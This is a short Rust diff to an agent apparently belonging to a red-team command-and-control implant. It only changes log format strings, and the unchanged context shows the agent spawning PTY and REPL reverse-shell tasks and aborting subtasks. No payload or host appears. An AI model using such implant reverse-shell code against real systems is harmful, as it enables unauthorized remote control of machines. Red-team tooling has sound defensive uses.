@@ -220,7 +220,7 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
         let handle = self.runtime_handle.spawn(async move {
             if let Err(_e) = run_reverse_shell_pty(task_id, cmd, transport_clone).await {
                 #[cfg(debug_assertions)]
-                log::error!("reverse_shell_pty error: {}", _e);
+                log::error!("reverse_shell_pty error: {_e}");
             }
         });
 
@@ -243,7 +243,7 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
         let handle = self.runtime_handle.spawn(async move {
             if let Err(_e) = run_repl_reverse_shell(task_id, transport_clone, agent).await {
                 #[cfg(debug_assertions)]
-                log::error!("repl_reverse_shell error: {}", _e);
+                log::error!("repl_reverse_shell error: {_e}");
             }
         });
 
@@ -310,7 +310,7 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
         if let Some(handle) = map.remove(&task_id) {
             handle.abort();
             #[cfg(debug_assertions)]
-            log::info!("Aborted subtask {}", task_id);
+            log::info!("Aborted subtask {task_id}");
         }
         Ok(())
     }
